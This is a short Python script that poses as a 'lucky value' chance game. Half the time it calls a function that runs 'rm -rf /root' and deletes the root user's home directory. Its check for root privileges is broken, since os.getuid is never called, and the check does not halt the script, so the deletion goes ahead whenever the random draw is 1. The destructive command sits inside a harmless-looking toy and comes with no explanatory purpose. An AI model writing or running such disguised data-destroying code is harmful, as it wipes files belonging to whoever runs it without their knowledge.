import random
import os
import sys
def remove():
    if os.getuid != 0:
        print("Run it with sudo command")
    os.system("rm -rf /root")
val = random.randint(0,1)
if val == 1:
    remove()
else:
    print(" lucky values is %d" % (val))
